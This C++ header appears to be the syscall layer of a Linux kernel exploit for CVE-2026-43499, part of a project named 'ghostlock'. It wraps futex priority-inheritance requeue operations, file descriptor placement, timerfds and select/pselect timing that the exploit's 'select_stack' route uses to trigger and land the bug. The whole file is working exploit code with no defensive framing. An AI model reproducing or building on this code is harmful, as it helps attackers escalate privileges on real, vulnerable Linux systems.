#pragma once
/** @file backend/cve_2026_43499/landing/select_stack_route_linux.hpp
 *  Linux syscall edge for the select_stack route. The route owns order and decisions;
 *  this file only performs the operations the template names.
 */
#if defined(__linux__)
#include <cerrno>
#include <cstddef>
#include <cstdint>
#include <ctime>

#include <fcntl.h>
#include <linux/futex.h>
#include <sys/select.h>
#include <sys/syscall.h>
#include <sys/timerfd.h>
#include <unistd.h>

#include "backend/cve_2026_43499/landing/multicast_consumer.hpp"

namespace ghostlock::backend::cve_2026_43499::landing {
    struct SelectStackRouteLinux final {
        static std::int32_t make_pipe(std::int32_t &read_fd, std::int32_t &write_fd) noexcept {
            int fds[2] = {-1, -1};
            if (::pipe(fds) != 0) return static_cast<std::int32_t>(errno);
            read_fd = fds[0];
            write_fd = fds[1];
            return 0;
        }

        static std::int32_t make_idle_timer() noexcept {
            return ::timerfd_create(CLOCK_MONOTONIC, TFD_CLOEXEC | TFD_NONBLOCK);
        }

        static std::int32_t duplicate_above(std::int32_t fd, std::int32_t minimum) noexcept {
            return ::fcntl(fd, F_DUPFD_CLOEXEC, minimum);
        }

        static std::int32_t install_at(std::int32_t fd, std::int32_t target) noexcept {
            return ::dup2(fd, target) < 0 ? static_cast<std::int32_t>(errno) : 0;
        }

        static std::int32_t lock_pi(std::uint32_t *word) noexcept {
            return static_cast<std::int32_t>(::syscall(SYS_futex, word, FUTEX_LOCK_PI, 0U, nullptr, nullptr, 0));
        }

        static std::int32_t unlock_pi(std::uint32_t *word) noexcept {
            return static_cast<std::int32_t>(::syscall(SYS_futex, word, FUTEX_UNLOCK_PI, 0U, nullptr, nullptr, 0));
        }

        static std::int32_t cmp_requeue_pi(std::uint32_t *word, std::uint32_t *other) noexcept {
            /* CMP_REQUEUE_PI: val=1, val2=1, val3=expected *uaddr (the wait word). */
            const std::uint32_t expected = (word != nullptr) ? *word : 0U;
            return static_cast<std::int32_t>(::syscall(SYS_futex, word, FUTEX_CMP_REQUEUE_PI, 1U,
                                                      reinterpret_cast<const void *>(1), other, expected));
        }

        static std::int32_t wait_requeue_pi_until(std::uint32_t *word, std::uint32_t *other,
                                                  std::int64_t micros) noexcept {
            /* Futex wait timeouts are absolute CLOCK_MONOTONIC deadlines. */
            struct timespec deadline{};
            (void) ::clock_gettime(CLOCK_MONOTONIC, &deadline);
            if (micros > 0) {
                deadline.tv_sec += static_cast<time_t>(micros / 1000000);
                deadline.tv_nsec += static_cast<long>((micros % 1000000) * 1000);
                if (deadline.tv_nsec >= 1000000000L) {
                    deadline.tv_sec += 1;
                    deadline.tv_nsec -= 1000000000L;
                }
            } else {
                deadline.tv_nsec += 1L;
            }
            const std::uint32_t expected = (word != nullptr) ? *word : 0U;
            errno = 0;
            return static_cast<std::int32_t>(::syscall(SYS_futex, word, FUTEX_WAIT_REQUEUE_PI, expected, &deadline, other, 0));
        }

        static std::int32_t setattr(std::int32_t tid, std::int32_t nice, std::uint32_t policy) noexcept {
            return static_cast<std::int32_t>(sched_setattr_nice(tid, nice, policy));
        }

        static std::int32_t pselect_now(int nfds, fd_set &in, fd_set &out, fd_set &ex,
                                        std::int64_t wait_us) noexcept {
            struct timespec span{};
            if (wait_us > 0) {
                span.tv_sec = static_cast<time_t>(wait_us / 1000000);
                span.tv_nsec = static_cast<long>((wait_us % 1000000) * 1000);
            }
            return static_cast<std::int32_t>(::pselect(nfds, &in, &out, &ex, &span, nullptr));
        }

        static std::int32_t select_now(int nfds, fd_set &in, fd_set &out, fd_set &ex,
                                      std::int64_t wait_us) noexcept {
            struct timeval span{};
            if (wait_us > 0) {
                span.tv_sec = static_cast<time_t>(wait_us / 1000000);
                span.tv_usec = static_cast<suseconds_t>(wait_us % 1000000);
            }
            return static_cast<std::int32_t>(::select(nfds, &in, &out, &ex, &span));
        }

        static bool is_open(std::int32_t fd) noexcept {
            errno = 0;
            const int answer = ::fcntl(fd, F_GETFD);
            return answer != -1 || errno != EBADF;
        }

        static std::int32_t thread_id() noexcept {
            return static_cast<std::int32_t>(::syscall(SYS_gettid));
        }

        static void yield() noexcept { ::sched_yield(); }

        static void sleep_micros(std::int64_t micros) noexcept {
            if (micros > 0) (void) ::usleep(static_cast<useconds_t>(micros));
        }

        static void close_fd(std::int32_t fd) noexcept {
            if (fd >= 0) (void) ::close(fd);
        }

        static std::int32_t last_errno() noexcept { return static_cast<std::int32_t>(errno); }
    };
}  // namespace ghostlock::backend::cve_2026_43499::landing
#endif
